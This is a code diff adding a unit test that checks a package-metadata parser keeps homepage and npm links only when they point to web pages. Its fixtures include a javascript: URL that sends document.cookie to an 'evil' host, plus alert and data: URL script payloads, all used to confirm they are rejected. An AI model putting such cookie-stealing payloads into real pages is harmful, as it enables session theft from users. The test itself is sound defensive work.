@@ -47,3 +47,11 @@ test("a result without a name or version is left out", () => {
   assert.equal(toPackage({ package: { name: "x" } }), undefined);
   assert.equal(toPackage({ package: { name: "x", version: "1", keywords: ["pi-package", "LLM-Provider"] } }).provider, true);
 });
+
+test("a package's link is kept only when it goes to a web page", () => {
+  const one = (links) => toPackage({ package: { name: "pi-x", version: "1.0.0", keywords: ["pi-package"], links } });
+  assert.equal(one({ homepage: "javascript:fetch('//evil/'+document.cookie)" }).homepage, undefined);
+  assert.equal(one({ homepage: "javascript:alert(1)", repository: "https://github.com/a/b" }).homepage, "https://github.com/a/b");
+  assert.equal(one({ npm: "data:text/html,<script>1</script>" }).npm, undefined);
+  assert.equal(one({ homepage: "https://pi.dev/x" }).homepage, "https://pi.dev/x");
+});
